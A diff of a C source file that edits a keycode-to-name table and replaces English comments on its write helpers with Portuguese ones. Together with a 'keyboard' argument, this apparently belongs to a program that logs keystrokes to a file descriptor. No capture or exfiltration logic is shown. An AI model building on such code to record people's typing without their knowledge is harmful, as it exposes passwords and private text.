@@ -10,8 +10,8 @@
 #define NUM_KEYCODES 128
 
 const char *keycodes[] = {
-    "RESERVED",
-    "ESC",
+    "RESERVED ",
+    "ESC ",
     "1",
     "2",
     "3",
@@ -25,7 +25,7 @@ const char *keycodes[] = {
     "-",
     "=",
     "BACKSPACE",
-    "TAB",
+    "TAB ",
     "q",
     "w",
     "e",
@@ -39,7 +39,7 @@ const char *keycodes[] = {
     "´",
     "[",
     "ENTER",
-    "LEFTCTRL",
+    "LEFTCTRL ",
     "a",
     "s",
     "d",
@@ -51,8 +51,8 @@ const char *keycodes[] = {
     "l",
     "ç",
     "~",
-    "APOSTROPHE",
-    "LEFTSHIFT",
+    "APOSTROPHE ",
+    "LEFTSHIFT ",
     "]",
     "z",
     "x",
@@ -64,70 +64,70 @@ const char *keycodes[] = {
     ",",
     ".",
     ";",
-    "RIGHTSHIFT",
+    "RIGHTSHIFT ",
     "KPASTERISK",
-    "LEFTALT",
+    "LEFTALT ",
     "SPACE",
     "CAPSLOCK",
-    "F1",
-    "F2",
-    "F3",
-    "F4",
-    "F5",
-    "F6",
-    "F7",
-    "F8",
-    "F9",
-    "F10",
-    "NUMLOCK",
-    "SCROLLLOCK",
-    "KP7",
-    "KP8",
-    "KP9",
-    "KPMINUS",
-    "KP4",
-    "KP5",
-    "KP6",
-    "KPPLUS",
-    "KP1",
-    "KP2",
-    "KP3",
-    "KP0",
-    "KPCOMMA",
+    "F1 ",
+    "F2 ",
+    "F3 ",
+    "F4 ",
+    "F5 ",
+    "F6 ",
+    "F7 ",
+    "F8 ",
+    "F9 ",
+    "F10 ",
+    "NUMLOCK ",
+    "SCROLLLOCK ",
+    "KP7 ",
+    "KP8 ",
+    "KP9 ",
+    "KPMINUS ",
+    "KP4 ",
+    "KP5 ",
+    "KP6 ",
+    "KPPLUS ",
+    "KP1 ",
+    "KP2 ",
+    "KP3 ",
+    "KP0 ",
+    "KPCOMMA ",
     " ",
     " ",
-    "BACKSLASH",
-    "F11",
-    "F12",
-    "SLASH",
+    "BACKSLASH ",
+    "F11 ",
+    "F12 ",
+    "/",
     " ",
     " ",
     " ",
     " ",
-    "KPJPCOMMA",
-    "KPENTER",
+    "KPJPCOMMA ",
+    "KPENTER ",
     "RIGHENTER",
-    "RIGHTALT",
-    "KPSLASH",
-    "SYSRQ",
-    "ALTGR",
-    "UP",
-    "HOME",
-    "UP",
-    "PAGEUP",
-    "LEFT",
-    "RIGHT",
-    "END",
-    "DOWN",
-    "PAGEDOWN",
-    "MACRO",
-    "DELETE",
-    "VOLUMEDOWN",
-    "VOLUMEUP",
-    "POWER",
-    "KPEQUAL",
-    "TURNOFF",
-    "KPCOMMA",
+    "RIGHTALT ",
+    "/",
+    "SYSRQ ",
+    "ALTGR ",
+    "UP ",
+    "HOME ",
+    "UP ",
+    "PAGEUP ",
+    "LEFT ",
+    "RIGHT ",
+    "END ",
+    "DOWN ",
+    "PAGEDOWN ",
+    "MACRO ",
+    "DELETE ",
+    "VOLUMEDOWN ",
+    "VOLUMEUP ",
+    "POWER ",
+    "KPEQUAL ",
+    "TURNOFF ",
+    "KPCOMMA ",
     " ",
     " ",
     " ",
@@ -135,9 +135,9 @@ const char *keycodes[] = {
     " ",
     " ",
     " ",
-    "WIN",
+    "WIN ",
     " ",
-    "MENU"};
+    "MENU "};
 
 int loop = 1;
 
@@ -146,12 +146,7 @@ void sigint_handler(int sig)
   loop = 0;
 }
 
-/**
- * Ensures that the string pointed to by str is written to the file with file
- * descriptor file_desc.
- *
- * \returns 1 if writing completes succesfully, else 0
- */
+// Escreve em file_desc a string str
 int write_all(int file_desc, const char *str)
 {
   int bytesWritten = 0;
@@ -172,10 +167,7 @@ int write_all(int file_desc, const char *str)
   return 1;
 }
 
-/**
- * Wrapper around write_all which exits safely if the write fails, without
- * the SIGPIPE terminating the program abruptly.
- */
+// chama a write_all para dar exit de maneira segura
 void safe_write_all(int file_desc, const char *str, int keyboard)
 {
   struct sigaction new_actn, old_actns;
